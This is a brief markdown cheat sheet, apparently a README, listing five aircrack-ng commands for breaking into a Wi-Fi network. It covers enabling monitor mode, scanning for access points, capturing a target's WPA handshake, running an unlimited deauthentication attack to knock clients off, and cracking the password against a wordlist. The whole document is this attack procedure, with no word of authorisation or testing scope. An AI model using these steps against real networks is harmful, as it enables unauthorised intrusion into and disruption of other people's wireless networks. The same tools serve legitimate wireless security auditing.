# Aircrack suite

## TIP: All commands must be run with sudo

### Usage:

#### 1) airmon-ng start wlan0 (Assuming that the Wi-Fi interface is wlan0) (Check with iwconfig if the interface went to monitor mode)

#### 2) airodump-ng wlan0mon (Scans for Access Points' SSIDs and BSSIDs or simply a 48-bit MAC around us)

#### 3) airodump-ng wlan0mon -c NUM --bssid TARGET_BSSID -w pwd (NUM represents the channel the target is tuned in. Tune in your target, then wait to capture the handshake, then save it as a .cap file)

#### 4) aireplay-ng --deauth 0 -a TARGET_BSSID wlan0mon (Perform a deauthentication attack against the target)

#### 5) aircrack-ng HANDSHAKE_FILE.cap -w WORDLIST.txt (Crack the Wi-Fi password)
